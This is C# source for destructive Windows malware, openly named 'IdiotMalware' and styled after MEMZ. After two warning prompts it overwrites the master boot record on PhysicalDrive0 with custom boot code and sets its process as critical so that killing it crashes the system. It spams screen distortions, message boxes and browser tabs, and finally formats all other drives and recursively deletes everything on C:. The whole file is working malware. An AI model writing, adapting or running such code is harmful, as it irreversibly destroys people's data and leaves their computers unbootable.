using System;
using System.Drawing;
using System.Windows.Forms;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;
using System.Text;
using System.IO;
using System.Collections.Generic;

namespace IdiotMalware
{
    class Program
    {
        // --- API IMPORT (GDI, MBR, SYSTEM) ---
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);
        
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten, IntPtr lpOverlapped);
        
        [DllImport("user32.dll")]
        static extern IntPtr GetDC(IntPtr hWnd);
        
        [DllImport("user32.dll")]
        static extern int GetSystemMetrics(int nIndex);
        
        [DllImport("gdi32.dll")]
        static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);
        
        [DllImport("ntdll.dll")]
        static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
        
        [DllImport("shell32.dll", CharSet = CharSet.Auto)]
        static extern IntPtr ExtractIcon(IntPtr hInst, string lpszExeFileName, int nIconIndex);

        static Random rnd = new Random();
        static List<Form> trail = new List<Form>();
        
        // TWOJE WIADOMOŚCI (Ikona 48)
        static string[] msgTexts = { "Chips are coming", "RUN", "Idiot", "Lol", "Really?" };
        
        // STRONY DO OTWIERANIA (Browser Terror)
        static string[] zlosliweStrony = {
            "https://www.google.com/search?q=how+to+fix+a+virus",
            "https://www.google.com/search?q=why+my+computer+is+so+slow",
            "https://www.google.com/search?q=what+is+MBR",
            "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
            "https://answers.microsoft.com/en-us/windows/forum/all/how-to-fix-boot-loader/"
        };

        [STAThread]
        static void Main(string[] args)
        {
            Application.EnableVisualStyles();

            // 1. Ostrzeżenia początkowe
            if (MessageBox.Show("Warning: Your computer will be destroyed.", "Warning", MessageBoxButtons.YesNo, (MessageBoxIcon)16) != DialogResult.Yes) return;
            if (MessageBox.Show("LAST WARNING.", "STOP", MessageBoxButtons.YesNo, (MessageBoxIcon)16) != DialogResult.Yes) return;

            // 2. Nadpisanie MBR
            OverwriteMBR();

            // 3. Otwarcie Notatnika z Twoją treścią
            OpenNotePad();

            // 4. Proces krytyczny (BSOD przy próbie zabicia)
            int isCritical = 1;
            try { NtSetInformationProcess(Process.GetCurrentProcess().Handle, 0x1D, ref isCritical, sizeof(int)); } catch { }

            // 5. Start wątków efektów (Reżyser Chaosu)
            new Thread(DirectorThread).Start();

            // 6. Mechanizm NIEKOŃCZĄCEGO SIĘ OGONA (Dropping Trail)
            System.Windows.Forms.Timer t = new System.Windows.Forms.Timer { Interval = 15 };
            t.Tick += (s, e) => {
                Point target = Cursor.Position;
                
                // Tworzenie nowej ikony z shell32.dll za każdym "tikiem"
                Form f = new Form { 
                    FormBorderStyle = FormBorderStyle.None, 
                    Size = new Size(32, 32), 
                    BackColor = Color.Magenta, 
                    TransparencyKey = Color.Magenta, 
                    TopMost = true, 
                    ShowInTaskbar = false, 
                    StartPosition = FormStartPosition.Manual 
                };
                
                PictureBox pb = new PictureBox { Dock = DockStyle.Fill, SizeMode = PictureBoxSizeMode.StretchImage };
                
                // Indeksy ikon w stylu MEMZ
                int[] memzIcons = { 3, 4, 10, 15, 235, 240, 47 }; 
                IntPtr hIcon = ExtractIcon(IntPtr.Zero, "shell32.dll", memzIcons[rnd.Next(memzIcons.Length)]);
                
                if (hIcon != IntPtr.Zero) pb.Image = Icon.FromHandle(hIcon).ToBitmap();

                f.Controls.Add(pb);
                f.Location = new Point(target.X + rnd.Next(-5, 6), target.Y + rnd.Next(-5, 6));
                f.Show();
                
                trail.Add(f); // Ikony zostają na ekranie
            };
            t.Start();

            // Ukryte okno główne
            Application.Run(new Form() { Opacity = 0, ShowInTaskbar = false, WindowState = FormWindowState.Minimized });
        }

        static void DirectorThread()
        {
            Thread.Sleep(5000); 
            new Thread(Payload_TikTokScroll).Start(); 
            new Thread(Payload_ScreenShake).Start();  
            
            Thread.Sleep(10000);
            new Thread(Payload_Spam_MsgBox).Start(); 
            new Thread(Payload_Browser_Terror).Start();

            Thread.Sleep(30000);
            TotalDestruction(); // Kasowanie plików bez shutdowna
        }

        static void OpenNotePad()
        {
            string path = Path.Combine(Path.GetTempPath(), "READ_ME.txt");
            string content = "Your computer has been damaged by: Chips.\n\n" +
                             " Do not attempt to disable the virus process or restart your computer.\n" +
                             " The computer may still work after shutting down, but once you turn it off, it won't start again because the MBR has been overwritten.\n\n" +
                             " I and the other authors are not responsible for any damages.";
            try { File.WriteAllText(path, content); Process.Start("notepad.exe", path); } catch { }
        }

        static void Payload_TikTokScroll()
        {
            IntPtr hdc = GetDC(IntPtr.Zero);
            int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
            while (true)
            {
                BitBlt(hdc, 0, -30, w, h, hdc, 0, 0, 0x00CC0020);
                BitBlt(hdc, 0, h - 30, w, 30, hdc, 0, 0, 0x00CC0020);
                Thread.Sleep(5); 
            }
        }

        static void Payload_ScreenShake()
        {
            IntPtr hdc = GetDC(IntPtr.Zero);
            int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
            while (true)
            {
                BitBlt(hdc, rnd.Next(-50, 51), 0, w, h, hdc, 0, 0, 0x00CC0020);
                Thread.Sleep(10);
            }
        }

        static void Payload_Spam_MsgBox()
        {
            while (true)
            {
                string txt = msgTexts[rnd.Next(msgTexts.Length)];
                new Thread(() => {
                    MessageBox.Show(txt, "Idiot", MessageBoxButtons.OK, (MessageBoxIcon)48);
                }).Start();
                Thread.Sleep(1500); 
            }
        }
        
        static void Payload_Browser_Terror()
        {
            while (true) {
                try {
                    string url = zlosliweStrony[rnd.Next(zlosliweStrony.Length)];
                    Process.Start(url); 
                } catch { }
                Thread.Sleep(20000); // Co 20 sekund nowa strona
            }
        }

        static void OverwriteMBR()
        {
            byte[] mbr = new byte[512];
            byte[] bootCode = { 0xB8, 0x13, 0x00, 0xCD, 0x10, 0xB8, 0x00, 0xA0, 0x8E, 0xC0, 0xBE, 0x80, 0x7C, 0xB4, 0x0E, 0xAC, 0x08, 0xC0, 0x74, 0x04, 0xCD, 0x10, 0xEB, 0xF7, 0x31, 0xDB, 0x31, 0xC0, 0x31, 0xFF, 0xB9, 0x00, 0xFA, 0xF3, 0xAB, 0xBF, 0x40, 0x7D, 0x01, 0xDF, 0xB0, 0x2C, 0xB9, 0x60, 0x09, 0xF3, 0xAA, 0x43, 0xB4, 0x86, 0x31, 0xC9, 0xBA, 0x10, 0x27, 0xCD, 0x15, 0xEB, 0xE2 };
            byte[] msg = Encoding.ASCII.GetBytes("Chips Be Here, the computer was eaten by: Chips\0");
            Array.Copy(bootCode, 0, mbr, 0, bootCode.Length); Array.Copy(msg, 0, mbr, 0x80, msg.Length);
            mbr[510] = 0x55; mbr[511] = 0xAA;
            try {
                IntPtr hDrive = CreateFile("\\\\.\\PhysicalDrive0", 0x40000000, 1 | 2, IntPtr.Zero, 3, 0, IntPtr.Zero);
                if (hDrive != (IntPtr)(-1)) { uint written; WriteFile(hDrive, mbr, 512, out written, IntPtr.Zero); }
            } catch {}
        }

        static void TotalDestruction()
        {
            foreach (DriveInfo d in DriveInfo.GetDrives()) { if (d.IsReady && d.Name != "C:\\") { try { Process.Start("cmd.exe", "/c format " + d.Name.Substring(0, 2) + " /FS:NTFS /Q /Y /X"); } catch { } } }
            try { Process.Start("cmd.exe", "/c del /s /q /f C:\\*.*"); } catch { }
        }
    }
}
